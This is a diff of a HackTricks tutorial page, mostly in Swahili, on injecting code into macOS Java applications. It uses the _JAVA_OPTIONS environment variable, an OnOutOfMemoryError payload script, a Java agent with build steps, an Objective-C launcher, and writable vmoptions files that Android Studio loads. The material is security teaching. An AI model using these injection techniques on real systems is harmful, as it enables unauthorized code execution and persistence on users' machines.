@@ -1,22 +1,23 @@
-# Uingizaji wa Programu za Java kwenye macOS
+# macOS Java Applications Injection
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Uchunguzi
+## Enumeration
 
-Tafuta programu za Java zilizosakinishwa kwenye mfumo wako. Ili kugundua programu za Java katika **Info.plist**, unaweza kutafuta vigezo vya java ambavyo vinajumuisha herufi **`java.`**, hivyo unaweza kutafuta kwa kutumia hilo:
+Pata programu za Java zilizowekwa kwenye mfumo wako. Iligundulika kuwa programu za Java katika **Info.plist** zitakuwa na baadhi ya vigezo vya java ambavyo vina nyuzi **`java.`**, hivyo unaweza kutafuta hilo:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -26,13 +27,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA\_OPTIONS
 
-Variable ya mazingira **`_JAVA_OPTIONS`** inaweza kutumika kuwezesha vigezo vya Java visivyo na kikomo katika utekelezaji wa programu iliyoundwa kwa kutumia Java:
+Kigezo cha mazingira **`_JAVA_OPTIONS`** kinaweza kutumika kuingiza vigezo vya java vya kiholela katika utekelezaji wa programu iliyotengenezwa kwa java:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Ili kuendesha kama mchakato mpya na sio kama mtoto wa terminal ya sasa, unaweza kutumia:
+Ili kuitekeleza kama mchakato mpya na si kama mtoto wa terminal ya sasa unaweza kutumia:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -85,7 +86,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Hata hivyo, hii itasababisha kosa kwenye programu inayotekelezwa, njia nyingine ya siri zaidi ni kuunda wakala wa Java na kutumia:
+Hata hivyo, hiyo itasababisha kosa kwenye programu iliyotekelezwa, njia nyingine ya siri zaidi ni kuunda wakala wa java na kutumia:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -95,10 +96,10 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 {% hint style="danger" %}
-Kuunda wakala na **toleo tofauti la Java** kutoka kwa programu inaweza kusababisha kushindwa kwa utekelezaji wa wakala na programu
+Kuunda wakala kwa **toleo tofauti la Java** kutoka kwa programu kunaweza kusababisha kuanguka kwa utekelezaji wa wakala na programu zote mbili
 {% endhint %}
 
-Ambapo wakala anaweza kuwa:
+Mahali ambapo wakala anaweza kuwa:
 
 {% code title="Agent.java" %}
 ```java
@@ -119,7 +120,7 @@ err.printStackTrace();
 ```
 {% endcode %}
 
-Ili kutekeleza wakala, endesha:
+Ili kukusanya wakala, endesha:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -131,7 +132,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Na kisha weka mazingira ya kipekee na endesha programu ya Java kama ifuatavyo:
+Na kisha peleka variable ya env na uendeshe programu ya java kama:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -140,14 +141,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## Faili la vmoptions
+## vmoptions file
 
-Faili hili linasaidia ufafanuzi wa **params za Java** wakati Java inatekelezwa. Unaweza kutumia mbinu zilizotangulia kubadilisha params za java na **kufanya mchakato utekeleze amri za kiholela**.\
-Zaidi ya hayo, faili hili pia linaweza **kuhusisha faili zingine** na kwa kutumia `include` directory, hivyo unaweza pia kubadilisha faili iliyohusishwa.
+Faili hili linaunga mkono uainishaji wa **Java params** wakati Java inatekelezwa. Unaweza kutumia baadhi ya hila za awali kubadilisha java params na **kufanya mchakato utekeleze amri zisizo za kawaida**.\
+Zaidi ya hayo, faili hili linaweza pia **kujumuisha wengine** kwa kutumia saraka ya `include`, hivyo unaweza pia kubadilisha faili iliyojumuishwa.
 
-Zaidi ya hayo, baadhi ya programu za Java zitapakia **zaidi ya faili moja ya `vmoptions`**.
+Zaidi ya hayo, baadhi ya programu za Java zitakuwa **zinaweza kupakia zaidi ya faili moja ya `vmoptions`**.
 
-Baadhi ya programu kama Android Studio inaonyesha katika **matokeo yake wapi wanatafuta** faili hizi, kama:
+Baadhi ya programu kama Android Studio zinaonyesha katika **matokeo yao wanatazamia** faili hizi, kama:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -158,7 +159,7 @@ Baadhi ya programu kama Android Studio inaonyesha katika **matokeo yake wapi wan
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Ikiwa hawana, unaweza kuchunguza kwa urahisi kwa kutumia:
+Ikiwa hawafanyi hivyo, unaweza kuangalia kwa urahisi kwa:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -166,18 +167,19 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Tazama jinsi ilivyo ya kuvutia kwamba Android Studio katika mfano huu inajaribu kupakia faili **`/Applications/Android Studio.app.vmoptions`**, mahali ambapo mtumiaji yeyote kutoka kwenye kikundi cha **`admin` ana ufikiaji wa kuandika.**
+Note how interesting is that Android Studio in this example is trying to load the file **`/Applications/Android Studio.app.vmoptions`**, a place where any user from the **`admin` group has write access.**
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
